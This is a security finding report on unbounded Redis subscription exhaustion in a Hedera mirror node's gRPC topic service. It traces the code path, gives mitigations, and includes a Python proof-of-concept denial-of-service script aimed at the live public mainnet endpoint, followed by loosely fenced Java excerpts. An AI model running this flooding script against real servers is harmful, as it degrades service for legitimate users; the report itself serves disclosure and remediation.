### Title
Unbounded Redis Subscription Exhaustion via Unauthenticated gRPC Topic Subscription

### Summary
`RedisTopicListener.getSharedListener()` uses an unbounded `ConcurrentHashMap` (`topicMessages`) to track per-topic Redis subscriptions, with no cap on its size and no rate limiting or connection count limit on the gRPC endpoint. An unauthenticated attacker can open many gRPC connections and subscribe to thousands of distinct valid topic IDs, causing a proportional number of Redis `SUBSCRIBE` channel registrations to accumulate, exhausting Redis memory and degrading service for all legitimate subscribers.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` → `TopicMessageServiceImpl.subscribeTopic()` → `topicExists()` → `topicListener.listen()` → `SharedTopicListener.listen()` → `RedisTopicListener.getSharedListener()` → `computeIfAbsent(key, k -> subscribe(topic))`

**Root cause:**

In `RedisTopicListener.getSharedListener()` (line 61):
```java
return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
```
`topicMessages` is a plain `ConcurrentHashMap` with no size bound. Each unique topic key that passes the `topicExists()` gate causes `subscribe(topic)` to be called, which registers a new channel with the shared `ReactiveRedisMessageListenerContainer` via `r.receive(Collections.singletonList(topic), ...)` (line 72). The `.share()` operator (line 79) means the underlying Redis `SUBSCRIBE` command fires on first subscriber and persists until all subscribers cancel.

**Exploit flow:**

1. Attacker enumerates valid Hedera topic IDs via the public REST API (no auth required).
2. Attacker opens many gRPC connections to port 5600 (no connection count limit is configured — only `maxConcurrentCallsPerConnection = 5` per connection exists).
3. Each connection issues 5 concurrent `subscribeTopic` RPCs, each targeting a distinct valid topic ID.
4. Each unique topic passes `topicExists()` (default `checkTopicExists = true`) and reaches `computeIfAbsent`, inserting a new entry and triggering a Redis `SUBSCRIBE` for that channel.
5. Attacker holds connections open; `doOnCancel`/`doOnComplete` cleanup (line 74–75) never fires.
6. With N connections × 5 calls each, N×5 Redis channel subscriptions accumulate with no server-side ceiling.

**Why existing checks fail:**

- `checkTopicExists = true` (default) only requires the topic to exist in the DB — it does not limit how many distinct topics one client may subscribe to simultaneously.
- `maxConcurrentCallsPerConnection = 5` limits calls *per connection* but there is no limit on the number of inbound connections (`maxConnections`/`maxInboundConnections` is never set in `GrpcConfiguration`).
- No rate limiting, no subscription quota per IP, no cap on `topicMessages.size()`.
- The `share()` operator deduplicates subscriptions for the *same* topic, but provides zero protection against subscriptions across *different* topics.

### Impact Explanation

Each entry in `topicMessages` corresponds to an active Redis pub/sub channel registration. Redis tracks all subscribed channels in memory; a large number of unique channel subscriptions increases Redis memory consumption and CPU overhead for message fan-out bookkeeping. If Redis reaches its `maxmemory` limit or the JVM heap fills with the `topicMessages` map entries and associated Flux state, the gRPC service becomes unable to deliver messages to legitimate subscribers, constituting a full denial of service. Severity: **High** (availability impact on a core real-time data delivery path).

### Likelihood Explanation

The gRPC endpoint is publicly reachable with no authentication. Valid topic IDs are trivially enumerable from the public REST API. A single attacker machine can open hundreds of TCP connections and saturate the subscription map within seconds. The attack is repeatable and requires no special privileges, credentials, or insider knowledge — only a gRPC client library and a list of topic IDs.

### Recommendation

1. **Cap `topicMessages` size**: Replace `ConcurrentHashMap` with a bounded structure (e.g., Guava `CacheBuilder.maximumSize(N)`) and reject new subscriptions when the cap is reached.
2. **Limit total inbound gRPC connections**: Set `maxConnectionAge`, `maxConnectionIdle`, and a total connection limit via `NettyServerBuilder` in `GrpcConfiguration`.
3. **Per-IP / per-client subscription quota**: Track active subscription count per remote address and reject requests exceeding a configurable threshold.
4. **Rate-limit `subscribeTopic` RPCs**: Apply a token-bucket throttle at the `ConsensusController` level, analogous to the `ThrottleConfiguration` used in the web3 module.
5. **Idle subscription reaping**: Add a TTL-based eviction to `topicMessages` so stale entries (where the shared Flux has no active downstream subscribers) are removed proactively.

### Proof of Concept

```python
import grpc, threading
# pip install grpcio hedera-mirror-node-proto (or equivalent)
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from com.hederahashgraph.api.proto.java import basic_types_pb2

# 1. Enumerate valid topic IDs from the public REST API
import requests
topics = [r["topic_id"].split(".")[-1]
          for r in requests.get("https://mainnet-public.mirrornode.hedera.com/api/v1/topics?limit=100").json()["topics"]]

# 2. Open many connections and subscribe to distinct topics
def attack(topic_id):
    channel = grpc.insecure_channel("grpc.mainnet.mirrornode.hedera.com:443")
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=int(topic_id))
    )
    for _ in stub.subscribeTopic(req):  # hold stream open
        pass

threads = [threading.Thread(target=attack, args=(t,)) for t in topics * 20]
for t in threads: t.start()
# Each thread holds a live gRPC stream → one Redis SUBSCRIBE per unique topic
# topicMessages map grows; Redis channel registrations accumulate

    private Flux<TopicMessage> subscribe(Topic topic) {
        Duration interval = listenerProperties.getInterval();

        return container
                .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
                .map(Message::getMessage)
                .doOnCancel(() -> unsubscribe(topic))
                .doOnComplete(() -> unsubscribe(topic))
                .doOnError(t -> log.error("Error listening for messages", t))
                .doOnSubscribe(s -> log.info("Creating shared subscription to {}", topic))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
                .share();
    }
```

    private Mono<?> topicExists(TopicMessageFilter filter) {
        var topicId = filter.getTopicId();
        return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
                .switchIfEmpty(
                        grpcProperties.isCheckTopicExists()
                                ? Mono.error(new EntityNotFoundException(topicId))
                                : Mono.just(Entity.builder()
                                        .memo("")
                                        .type(EntityType.TOPIC)
                                        .build()))
                .filter(e -> e.getType() == EntityType.TOPIC)
                .switchIfEmpty(Mono.error(new IllegalArgumentException("Not a valid topic")));
    }
```
